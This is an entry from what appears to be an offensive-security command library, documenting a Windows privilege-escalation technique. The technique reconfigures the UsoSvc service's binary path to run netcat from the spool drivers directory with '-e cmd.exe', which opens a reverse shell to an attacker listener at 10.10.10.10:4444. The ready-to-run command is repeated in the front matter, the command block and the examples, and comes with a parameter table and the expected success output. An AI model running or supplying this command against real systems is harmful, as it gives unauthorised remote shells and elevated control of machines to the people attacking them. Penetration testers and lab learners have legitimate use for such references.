---
id: 7ef427b0-b7c9-473d-8e07-49d5c076f09f
name: Configure UsoSvc service to run nc.exe with IP 10.10.10.10 and port 4444
type: command
executor: cmd
data: >-
  sc.exe config usosvc binPath="C:\Windows\System32\spool\drivers\color\nc.exe
  10.10.10.10 4444 -e cmd.exe"
output: null
created_at: '2023-04-06T03:56:29.494877+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - privilege-escalation
  - service-exploitation
verified: true
validated: true
---

# Configure UsoSvc BinPath Spool NC

## Command

```cmd
sc.exe config usosvc binPath="C:\Windows\System32\spool\drivers\color\nc.exe $_ATTACKER_IP $_ATTACKER_PORT -e cmd.exe"
```

## Description

Configures the UsoSvc service binary path to execute netcat from the spool directory, establishing a reverse shell to the attacker's listener.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `config` | Operation to change service configuration | Yes |
| `usosvc` | Service name (case-insensitive) | Yes |
| `binPath=` | Sets the executable path and arguments | Yes |
| `$_ATTACKER_IP` | Attacker's IP address (e.g., 10.10.10.10) | Yes |
| `$_ATTACKER_PORT` | Listener port (e.g., 4444) | Yes |
| `-e cmd.exe` | Executes cmd.exe via netcat | Yes |

## Examples

### Basic Usage

```cmd
sc.exe config usosvc binPath="C:\Windows\System32\spool\drivers\color\nc.exe 10.10.10.10 4444 -e cmd.exe"
```

### With Custom Path

Adjust the nc.exe path if placed elsewhere writable.

## Expected Output

[SC] ChangeServiceConfig SUCCESS

## Related

- [[procedures/usosvc-service-account-remote-command-execution]]
- [[commands/query-usosvc-configuration]]
